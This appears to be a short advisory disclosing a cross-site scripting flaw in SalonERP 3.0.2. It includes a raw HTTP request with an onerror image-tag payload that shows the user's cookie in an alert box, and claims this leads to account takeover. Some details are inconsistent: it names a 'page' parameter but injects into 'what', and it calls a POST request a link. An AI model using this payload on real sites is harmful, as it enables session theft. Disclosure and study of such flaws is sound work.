## Description

SalonERP version 3.0.2 allows an external attacker to steal the cookie
of arbitrary users. This is possible because the application does not
correctly validate the page parameter against XSS attacks.

## Vulnerability

The XSS present in SalonERP 3.0.2, allows an unauthenticated remote
attacker to perform an Account Takeover. To trigger this vulnerability,
we will need to send the following malicious link to an victim in order
to hack their account:

```txt
POST /try/backend.php HTTP/2
Host: salonerp.sourceforge.io
Cookie: salonerp-id=EnznqgZ8cAX2N7stbSLl; PHPSESSID=2f8c90c0e918726eed019427af65f438
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Origin: https://hacker.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 61

what=settings<img+src=1+onerror="(alert)(document.cookie)" />
```

## Exploitation

In this attack we will obtain the victim user account, through a malicious
link.
